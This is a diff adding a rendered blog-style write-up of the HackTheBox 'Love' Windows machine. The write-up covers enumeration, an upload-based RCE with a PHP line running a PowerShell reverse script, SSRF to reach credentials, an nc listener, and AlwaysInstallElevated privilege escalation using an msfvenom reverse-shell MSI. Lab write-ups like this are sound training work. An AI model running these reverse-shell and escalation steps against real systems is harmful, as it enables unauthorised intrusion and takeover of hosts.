@@ -1,0 +1,63 @@
+I"�
+<p>Easy Windows box from HackTheBox.</p>
+
+<p>starting with nmap scan we found many ports open but many are fake services.
+Firstly i enumerated port 80,443,5000 as they were running web services.</p>
+
+<hr />
+<p>#voting-exploit</p>
+
+<p>running a voting portal on port 80.
+<em>Two exploits</em> found for this :</p>
+<ul>
+  <li><strong>Unauthenticated RCE</strong></li>
+  <li><strong>Authenticated RCE</strong></li>
+</ul>
+
+<h2 id="for-unauth-rce">For Unauth RCE</h2>
+<p>For Unauthenticated RCE we can upload powershell reverse script and execute using powershell.
+<code class="language-plaintext highlighter-rouge">&lt;?php echo exec("powershell reverse.ps1") ?&gt;</code></p>
+
+<p>so, I get #reverse-shell.</p>
+
+<p>Note: for me first time unauth RCE worked but then it was not working.</p>
+
+<h2 id="for-auth-rce">For Auth RCE</h2>
+<p>I found staging.love.htb  for port 443 nmap scan. So, let’s add it in /etc/hosts.</p>
+
+<p>On checking https://staging.love.htb, I found that I can scan any site using this and  nmap shown port 5000 which is forbidden to us.</p>
+
+<p>so let’s scan it.</p>
+
+<p>I tried many ways to scan it finally i scanned port 5000 on localhost.
+we can get credentials .
+<img src="assets/images/Pasted image 20210601172800.png" alt="Pasted image 20210601172800.png" /></p>
+
+<p>I tried exploit of searchsploit but it has some things misconfigured so i corrected it.
+I’m putting that RCE <a href="https://github.io/">here</a></p>
+
+<p>running listner using <code class="language-plaintext highlighter-rouge">rlwrap nc -lnvp 4444</code></p>
+
+<p>so, I got reverse shell as Phoebe user and got  #user-txt  by <code class="language-plaintext highlighter-rouge">type user.txt</code></p>
+
+<h1 id="root">Root</h1>
+<p>For Prive esc i thought to use sharpup.exe as it show min. things
+let’s upload SharpUp.exe using creating smbserver on our machine
+<code class="language-plaintext highlighter-rouge">impacket-smbserver kali .</code>    on kali</p>
+
+<p><code class="language-plaintext highlighter-rouge">copy \\ip\kali\SharpUp.exe SharpUp.exe</code> on windows</p>
+
+<p>On executing, it shows that registery permission is 1.
+<img src="assets/images/Pasted image 20210809160738.png" alt="Pasted image 20210809160738.png" /></p>
+
+<p>This permission allows any user to execute msi file.
+So, let’s create reverse.msi using msfvenom</p>
+
+<p><code class="language-plaintext highlighter-rouge">msfvenom -p windows\x64\reverse_tcp LHOST=ip LPORT=4242 -f msi -o reverse.msi</code></p>
+
+<p>run it as <code class="language-plaintext highlighter-rouge">msi /quiet /qn /i reverse.msi</code></p>
+
+<p>and you will get reverse shell as admin</p>
+
+<p>so, I got #root-txt  by <code class="language-plaintext highlighter-rouge">type root.txt</code></p>
+:ET
